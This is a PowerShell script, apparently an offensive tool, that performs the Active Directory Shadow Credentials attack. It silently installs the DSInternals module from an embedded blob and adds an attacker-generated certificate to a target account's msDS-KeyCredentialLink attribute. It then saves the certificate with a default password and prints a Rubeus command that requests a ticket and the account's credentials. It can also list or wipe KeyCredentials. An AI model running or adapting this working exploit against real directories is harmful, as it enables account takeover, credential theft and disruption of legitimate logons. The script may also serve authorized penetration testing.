function Install-DSInternals {
    $ErrorActionPreference = "SilentlyContinue"
    $outputFilePath = "C:\Users\Public\Documents\DSInternals.zip"
    $fileBytes = [Convert]::FromBase64String($base64String)
    [System.IO.File]::WriteAllBytes($outputFilePath, $fileBytes)
    Unblock-File C:\Users\Public\Documents\DSInternals.zip
    $zipFilePath = "C:\Users\Public\Documents\DSInternals.zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $destinationPath = "C:\Users\Public\Documents\"
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFilePath, $destinationPath)
    $currentUser = [System.Environment]::UserName
    $grandparentFolderPath = "C:\Users\$currentUser\Documents\WindowsPowerShell\Modules"
    $parentFolderPath = "C:\Users\$currentUser\Documents\WindowsPowerShell\Modules\DSInternals"
    $subFolderPath = "$parentFolderPath\4.14"
    if (-Not (Test-Path -Path $grandparentFolderPath -PathType Container)) {
        New-Item -Path $grandparentFolderPath -ItemType Directory -Force > $null
    }
    if (-Not (Test-Path -Path $parentFolderPath -PathType Container)) {
        New-Item -Path $parentFolderPath -ItemType Directory -Force > $null
    }
    if (-Not (Test-Path -Path $subFolderPath -PathType Container)) {
        New-Item -Path $subFolderPath -ItemType Directory -Force > $null
    }
    $sourceFolderPath = "C:\Users\Public\Documents\DSInternals"
    Copy-Item -Path "$sourceFolderPath\*" -Destination $subFolderPath -Recurse -Force
    $grandparentFolderPath = "C:\Windows\system32\WindowsPowerShell\v1.0\Modules"
    $parentFolderPath = "C:\Windows\system32\WindowsPowerShell\v1.0\Modules\DSInternals"
    $subFolderPath = "$parentFolderPath\4.14"
    if (-Not (Test-Path -Path $grandparentFolderPath -PathType Container)) {
        New-Item -Path $grandparentFolderPath -ItemType Directory -Force > $null
    }
    if (-Not (Test-Path -Path $parentFolderPath -PathType Container)) {
        New-Item -Path $parentFolderPath -ItemType Directory -Force > $null
    }
    if (-Not (Test-Path -Path $subFolderPath -PathType Container)) {
        New-Item -Path $subFolderPath -ItemType Directory -Force > $null
    }
    $sourceFolderPath = "C:\Users\Public\Documents\DSInternals"
    Copy-Item -Path "$sourceFolderPath\*" -Destination $subFolderPath -Recurse -Force
    Remove-Item -Path "C:\Users\Public\Documents\DSInternals.zip" -Force
    Remove-Item -Path "C:\Users\Public\Documents\DSInternals.cat" -Force
    Remove-Item -Path "C:\Users\Public\Documents\DSInternals" -Recurse -Force
    $ErrorActionPreference = "Continue"
}

function Generate-SelfSignedCert {
    param (
        [string]$cn
    )
    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider(2048)
    $req = New-Object System.Security.Cryptography.X509Certificates.CertificateRequest("CN=$cn", $rsa, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
    $cert = $req.CreateSelfSigned([datetimeoffset]::Now, [datetimeoffset]::Now.AddYears(1))
    return $cert
}

function Save-Cert {
    param (
        [System.Security.Cryptography.X509Certificates.X509Certificate2]$cert,
        [string]$path,
        [string]$password
    )
    $certBytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $password)
    [System.IO.File]::WriteAllBytes($path, $certBytes)
}

function Get-LdapSearchRoot {
    param (
        [string]$OUName,
        [string]$domainController,
        [string]$domain
    )
    $ldapPrefix = ""
    $ldapOu = ""

    if ($domainController) {
        $ldapPrefix = $domainController
    } elseif ($domain) {
        $ldapPrefix = $domain
    }

    if ($OUName) {
        $ldapOu = $OUName.Replace("ldap", "LDAP").Replace("LDAP://", "")
    } elseif ($domain) {
        $ldapOu = "DC=" + $domain.Replace(".", ",DC=")
    }

    $bindPath = ""
    if ($ldapPrefix) {
        $bindPath = "LDAP://$ldapPrefix"
    }
    if ($ldapOu) {
        if ($bindPath) {
            $bindPath = "$bindPath/$ldapOu"
        } else {
            $bindPath = "LDAP://$ldapOu"
        }
    }

    $directoryObject = New-Object System.DirectoryServices.DirectoryEntry($bindPath)
    $directoryObject.AuthenticationType = [System.DirectoryServices.AuthenticationTypes]::Secure -bor [System.DirectoryServices.AuthenticationTypes]::Sealing -bor [System.DirectoryServices.AuthenticationTypes]::Signing
    return $directoryObject
}

function Locate-Account {
    param (
        [string]$username,
        [string]$domain,
        [string]$domainController
    )
    $directoryObject = Get-LdapSearchRoot -OUName "" -domainController $domainController -domain $domain
    $userSearcher = New-Object System.DirectoryServices.DirectorySearcher($directoryObject)
    $userSearcher.PageSize = 1
    $userSearcher.Filter = "(&(sAMAccountName=$username))"
    $user = $userSearcher.FindOne()

    if ($user) {
        return $user.GetDirectoryEntry()
    } else {
        throw "Target user not found"
    }
}

function Decode-DnWithBinary {
    param (
        [object]$dnWithBinary
    )
    
    $binaryPart = $dnWithBinary.GetType().InvokeMember("BinaryValue", 'GetProperty', $null, $dnWithBinary, $null)
    $dnString = $dnWithBinary.GetType().InvokeMember("DNString", 'GetProperty', $null, $dnWithBinary, $null)
    
    return @($binaryPart, $dnString)
}

function List-KeyCredentials {
    param (
        [string]$target,
        [string]$domain,
        [string]$domainController,
        [switch]$Install
    )
    
    if (-not (Get-Module -ListAvailable -Name DSInternals)) {
        if($Install){
            Install-DSInternals
        }
        else{
            Write-Output "[-] DSInternals is not installed"
            Write-Output "[-] Please re-run with the -Install flag"
            break
        }
    }
    
    Import-Module DSInternals
    
    $targetObject = Locate-Account -username $target -domain $domain -domainController $domainController
    if (-not $targetObject) {
        throw "Target object not found"
    }

    $keyCredentials = $targetObject.Properties["msDS-KeyCredentialLink"]
    if (-not $keyCredentials) {
        Write-Host "No KeyCredentials found for the target object"
        return
    }

    Write-Host "KeyCredentials for ${target}:"

    $keyCredentialList = @()

    foreach ($keyCredential in $keyCredentials) {
        try {
            $decoded = Decode-DnWithBinary -dnWithBinary $keyCredential
            $binaryPart = $decoded[0]
            $dnString = $decoded[1]
            
            $parsedKeyCredential = [DSInternals.Common.Data.KeyCredential]::new($binaryPart, $dnString)
            
            if ($parsedKeyCredential.DeviceId -ne [guid]::Empty -and $parsedKeyCredential.CreationTime -gt [datetime]::MinValue) {
                $keyCredentialList += $parsedKeyCredential
            }
        } catch {
            # Skip this entry and continue with the next one
            continue
        }
    }

    # Sort the key credentials by CreationTime in ascending order
    $sortedKeyCredentials = $keyCredentialList | Sort-Object -Property CreationTime

    foreach ($keyCredential in $sortedKeyCredentials) {
        Write-Host "DeviceID: $($keyCredential.DeviceId) | Creation Time: $($keyCredential.CreationTime.ToString('dd/MM/yyyy HH:mm:ss'))"
    }
}

function Clear-KeyCredentials {
    param (
        [string]$target,
        [string]$domain,
        [string]$domainController,
        [guid]$deviceId,
        [switch]$Force,
        [switch]$Install
    )
    
    if (-not (Get-Module -ListAvailable -Name DSInternals)) {
        if ($Install) {
            Install-DSInternals
        } else {
            Write-Output "[-] DSInternals is not installed"
            Write-Output "[-] Please re-run with the -Install flag"
            break
        }
    }
    
    Import-Module DSInternals
    
    $targetObject = Locate-Account -username $target -domain $domain -domainController $domainController
    if (-not $targetObject) {
        throw "Target object not found"
    }

    if (-not $deviceId) {
        if (-not $Force) {
            Write-Host "[-] No DeviceID provided. Use the -Force flag to remove all KeyCredentials from the target."
			Write-Warning "Removing all keys from msDS-KeyCredentialLink is a risky operation, as it will break legitimate passwordless authentication."
            return
        } else {
            try {
                Write-Host "[*] Removing all KeyCredentials from the target object"
                $targetObject.Properties["msDS-KeyCredentialLink"].Clear()
                $targetObject.CommitChanges()
                Write-Host "[+] Removed all KeyCredentials from the target object"
                return
            } catch {
                Write-Output "[-] Could not clear attributes: $($_.Exception.Message)"
                return
            }
        }
    }

    try {
        Write-Host "[*] Updating the msDS-KeyCredentialLink attribute of the target object"
        
        $found = $false
        for ($i = 0; $i -lt $targetObject.Properties["msDS-KeyCredentialLink"].Count; $i++) {
            $decoded = Decode-DnWithBinary -dnWithBinary $targetObject.Properties["msDS-KeyCredentialLink"][$i]
            $binaryPart = $decoded[0]
            $dnString = $decoded[1]
            
            $keyCredential = [DSInternals.Common.Data.KeyCredential]::new($binaryPart, $dnString)
            if ($keyCredential.DeviceId -eq $deviceId) {
                $targetObject.Properties["msDS-KeyCredentialLink"].RemoveAt($i)
                $found = $true
                Write-Host "[+] Found and removed the KeyCredential with DeviceID: $deviceId"
                break
            }
        }
        if (-not $found) {
            Write-Host "[-] No KeyCredential found with DeviceID: $deviceId"
            return
        }
        $targetObject.CommitChanges()
        Write-Host "[+] Updated the msDS-KeyCredentialLink attribute of the target object"
    } catch {
        Write-Output "[-] Could not update attribute: $($_.Exception.Message)"
    }
}


function Add-KeyCredentials {
    param (
        [string]$target,
        [string]$domain,
        [string]$dc,
        [string]$path,
        [string]$password,
        [switch]$Install
    )
    
    if (-not (Get-Module -ListAvailable -Name DSInternals)) {
        if($Install){
            Install-DSInternals
        }
        else{
            Write-Output "[-] DSInternals is not installed"
            Write-Output "[-] Please re-run with the -Install flag"
            break
        }
    }
    
    Import-Module DSInternals
    
    if(!$path){
        $currentUser = [System.Environment]::UserName
        $path = "C:\Users\$currentUser\cert.pfx"
    }
    
    if(!$password){$password = "P@ssw0rd!"}

    $targetObject = Locate-Account -username $target -domain $domain -domainController $dc
    if (-not $targetObject) {
        throw "Target object not found"
    }

    Write-Host "[*] Generating certificate"
    $cert = Generate-SelfSignedCert -cn $target
    Write-Host "[*] Certificate generated"

    Write-Host "[*] Generating KeyCredential"
    $guid = [guid]::NewGuid()
    $keyCredential = New-Object DSInternals.Common.Data.KeyCredential($cert, $guid, $targetObject.Properties["distinguishedName"][0].ToString(), [datetime]::Now)
    Write-Host "[*] KeyCredential generated with DeviceID $($guid.ToString())"

    try {
        Write-Host "[*] Updating the msDS-KeyCredentialLink attribute of the target object"
        $targetObject.Properties["msDS-KeyCredentialLink"].Add($keyCredential.ToDNWithBinary()) > $null
        $targetObject.CommitChanges()
        Write-Host "[+] Updated the msDS-KeyCredentialLink attribute of the target object"
    } catch {
        Write-Output "[-] Could not update attribute: $($_.Exception.InnerException.Message)"
        break
    }

    if (-not $path) {
        Write-Host "[*] The associated certificate is:"
        $certBytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $password)
        [Convert]::ToBase64String($certBytes)
    } else {
        Write-Host "[*] Saving the associated certificate to file..."
        Save-Cert -cert $cert -path $path -password $password
        Write-Host "[*] The associated certificate was saved to $path"
    }
	Write-Host "[*] The associated certificate password is $password"

    Write-Host "[*] You can now run Rubeus with the following syntax:"
    Write-Host "Rubeus.exe asktgt /user:$target /certificate:$path /password:`"$password`" /domain:$domain /dc:$dc /getcredentials /nowrap"
}